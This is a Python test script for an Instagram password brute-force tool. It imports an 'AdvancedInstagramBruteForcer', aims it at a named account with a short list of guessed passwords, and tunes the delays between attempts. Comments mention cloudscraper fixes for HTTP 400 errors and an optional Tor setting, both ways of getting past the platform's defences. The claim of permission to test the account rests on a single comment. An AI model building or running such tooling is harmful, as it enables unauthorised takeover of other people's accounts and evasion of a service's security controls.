#!/usr/bin/env python3
"""
Quick Test for Instagram Brute Force Tool with HTTP 400 Fix
This script runs a quick test of our updated bruteforce_ig.py
with the HTTP 400 error fixes and cloudscraper improvements
"""

import sys
import time
import os
from pathlib import Path

# Add scripts directory to Python path
SCRIPT_DIR = Path(__file__).parent
sys.path.insert(0, str(SCRIPT_DIR))

# Import the tool
try:
    from bruteforce_ig import AdvancedInstagramBruteForcer, load_target_passwords
    print("✅ Successfully imported brute force modules")
except ImportError as e:
    print(f"❌ Import error: {e}")
    print("Please make sure you've installed all required packages:")
    print("/workspaces/sugarglitch-realops/venv/bin/python -m pip install cloudscraper fake-useragent aiohttp")
    sys.exit(1)


def run_test():
    """Run a quick test with test passwords"""
    print("\n🔍 TESTING BRUTE FORCE TOOL WITH HTTP 400 FIX")
    print("============================================")

    # Use a test target (real Instagram account that we're testing with permission)
    test_target = "alx.trading"

    # Test with just a few passwords for quick verification
    test_passwords = ["test123", "password123", "instagram2025"]

    print(f"🎯 Target: {test_target}")
    print(f"🔑 Test passwords: {test_passwords}")

    # Create the brute forcer instance
    brute_forcer = AdvancedInstagramBruteForcer(
        target_username=test_target,
        password_list=test_passwords,
        use_tor=False,  # Disable TOR for testing
    )

    # Set shorter delays for testing
    brute_forcer.min_delay = 1.0
    brute_forcer.max_delay = 2.0

    # Only run a single attempt for testing
    print("\n🚀 Running test attack...")
    brute_forcer.run_attack(max_attempts=1, test_mode=True)

    # Show statistics
    print("\n📊 TEST RESULTS")
    print(
        f"Attempts: {brute_forcer.failed_count + brute_forcer.success_count}")
    print(f"Success: {brute_forcer.success_count}")
    print(f"Failed: {brute_forcer.failed_count}")

    print("\n✅ Test completed - verify that HTTP 400 errors are properly handled")
    print("If you see 'HTTP 400 Bad Request', check that our debug output is printed")


if __name__ == "__main__":
    run_test()
